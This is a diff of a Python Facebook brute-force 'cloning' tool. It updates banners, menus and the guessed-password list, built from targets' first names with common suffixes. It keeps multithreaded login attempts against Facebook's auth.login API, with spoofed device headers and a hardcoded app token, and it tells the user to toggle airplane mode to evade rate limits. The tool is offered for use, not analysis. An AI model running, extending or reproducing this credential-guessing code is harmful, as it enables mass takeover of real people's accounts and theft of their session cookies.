@@ -196,7 +196,7 @@ def setting():
 		print (' [!] Choice Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method slow ');print (' [02] Method Fire \033[1;97m');print (' [03] Method lol \033[1;97m')
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
 	hc = input ("\n [#] method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -220,7 +220,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode✈️On/Off Every 2 Minutes\033[1;0m\n')
+	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 2 Minutes\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -247,7 +247,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [✓] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [✓] \033[1;96m🛫Turn Airplane Mode✈️ On/Off Every 3 Minutes🛬\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -267,7 +267,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [X] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n[©]\033[1;97m 🛫Turn Airplane Mode✈️ On/Off Every 5 Minutes🛬\033[1;0m\n\033[1;37m----------------------------------------------'%(okc,cpc))
+	print(logo);print( '\n [✓] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [✓] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [✓] \033[1;92m🛫Turn Airplane Mode ✈️ On/Off Every 5 Minutes🛬\033[1;0m\n♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -285,12 +285,9 @@ def name2():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'786')
-					pwv.append(frs+'@786')
-					pwv.append(frs+'@1122')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -303,7 +300,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[strating] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[starting] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -383,7 +380,7 @@ def follow(ses,coki):
 os.system ("xdg-open https://chat.whatsapp.com/J54ds3VTt2292ZaT4vYoJq")
 logo = ("""\033[1;30m
 \033[0;92m    CHAUDHARY[✓]New Free Command enjoy™️
-\033[1;97m----------------------------------------------\033[1;97m
+\033[1;97m♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪♪\033[1;97m
 \033[0;37m   _____ _____ _____ _____ 
 \033[0;37m   |  _  |  |  | __  |   __|
 \033[0;37m   |   __|  |  | __ -|  |  |
@@ -395,7 +392,7 @@ logo = ("""\033[1;30m
   \033[1;37m[√]  YouTube   : \033[1;37mCHAUDHARY TABISH
   \033[1;37m[√]  Status    : \033[1;37mFree and Enjoy  
   \033[1;37m[√]  Admin     : \033[1;37mMr SHAFAQAT
-  \033[0;97m[√]  𝐕𝐄𝐑𝐒𝐈𝐎𝐍   :\033[1;31m A.145
+  \033[0;97m[√]  𝐕𝐄𝐑𝐒𝐈𝐎𝐍   :\033[1;31m A.150
 \033[1;97m----------------------------------------------\033[1;37m""")
 class Main:
 	def __init__(self):
@@ -405,34 +402,36 @@ class Main:
 		self.loop = 0
 		os.system("clear")
 		print(logo)
-		print(""" 【1】\033[1;37m FB Hacking File Cloning\033[0;98m   ✓💯(Best)
- 【2】\033[1;37m Create File\033[0;98m 🤫(Moye Moye)
- 【3】\033[1;37m Simple Old Cloning Id's 2010-20\033[0;98m× (TimePass)
- 【4】\033[1;37m 2010-15 Cloning
- 【E】\033[1;31m Exit \n""")
-		MAINUL =input(" \033[1;32mSelect Option: ")
+		print("\033[1;37m 【1】 \033[1;37mBest FB File Cloning\033[0;92m   ✓ (Best)")
+		print("\033[1;37m 【2】 \033[1;37mCreate File Token & Coke's\033[0;92m(Moye Moye)")
+		print("\033[0;91m 【E】 Exit \n")
+		print("\033[1;37m----------------------------------------------")
+		MAINUL =input(" \033[1;37m━▷Choice Option: ")
 		if MAINUL in ["1", "01"]:
-			os.system("xdg-open https://youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH")
+			os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA")
 			File()
 		if MAINUL in ["2", "02"]:
-			os.system("xdg-open https://chat.whatsapp.com/G526jCk6gI90N4XNWbC3AH")
+			os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA")
 			Public()
+		if MAINUL in ["3", "03"]:
+			os.system('xdg-open  https://facebook.com/groups/571790004363677/?ref=share')
 		if MAINUL in ["4", "04"]:
-			os.system("xdg-open https://chat.whatsapp.com/G526jCk6gI90N4XNWbC3AH")
+			os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA")
 			self.old()
 		if MAINUL in ["5", "05"]:
-			os.system("xdg-open https://youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH")
+			os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA")
 			self.old2()
 			exit()
 		else:
 			print (" Select Correctly ")
 			time.sleep(1)
 			Main()
+ 
 	def old(self):
 		x = 111111111
 		xx = 999999999
-		idx = "200000" 
-		os.system("xdg-open https://youtube.com/@tabish3301?si=5oqBfnIIZxucVYwH");print(logo)
+		idx = "100000" 
+		os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA");print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50000: "))
 		try:
 			for n in range(limit):
@@ -832,14 +831,16 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
 				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
 				"x-fb-net-hni": str(random.randint(20000, 40000)), 
 				"x-fb-connection-quality": "EXCELLENT",
 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 				"user-agent": rua, 
 				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"}
+				"x-fb-http-engine": "Liger"
+			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
 				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
@@ -1261,14 +1262,16 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
 				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
 				"x-fb-net-hni": str(random.randint(20000, 40000)), 
 				"x-fb-connection-quality": "EXCELLENT",
 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 				"user-agent": rua, 
 				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"}
+				"x-fb-http-engine": "Liger"
+			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
